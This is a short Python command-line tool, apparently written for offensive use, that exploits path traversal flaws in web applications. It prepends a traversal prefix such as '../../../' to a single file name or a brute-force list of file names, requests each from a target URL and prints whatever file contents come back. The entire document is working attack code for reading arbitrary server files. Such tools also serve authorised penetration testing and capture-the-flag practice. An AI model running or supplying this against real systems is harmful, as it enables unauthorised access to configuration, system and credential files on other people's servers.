#!/bin/python3
import requests
import argparse
import sys
from os import system,name,path

if name == "nt":
	system('color')

RSTCOLORS = '\033[0m'
BOLD = '\033[1m'

def get_request(item, host):
	url=host+item
	try:
		r = requests.get(url=url)
		if r.status_code == 200:
			print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
			print(r.text)
		else:
			print(r)
	except Exception as e:
		print("[-] Oops, Unable to Process the Get Request")
		print(e)



def main():
	parser = argparse.ArgumentParser(description="Get juicy info through path traversal vulnerabilities")
	group1 = parser.add_mutually_exclusive_group(required=True)
	parser.add_argument('--base-url',action='store', dest='host',type=str,help='Vulnerable host and path - http://<server>/path.php=',required=True)
	parser.add_argument('--path',action='store', dest='path',type=str,help='Prefix path to prepend to all requests - ../../../',required=False,default=None)
	group1.add_argument('--list',action='store', dest='list',type=str,help='File with lists of file to bruteforce')
	group1.add_argument('--file',action='store', dest='file',type=str,help='Single server file to try to access',default=None)
	args = parser.parse_args()

	if args.list is not None:
		filename = args.list
		if path.isfile(filename):
			with open(filename,'r') as file_obj:
				for line in file_obj:
					if args.path is not None:
						get_request(args.path+line.rstrip(),args.host)
					else:
						get_request(line.rstrip(),args.host)
		else:
			print("[-] Unable to find file -->",filename)
			sys.exit()

	elif args.file is not None:
		get_request(args.path+args.file,args.host)

main()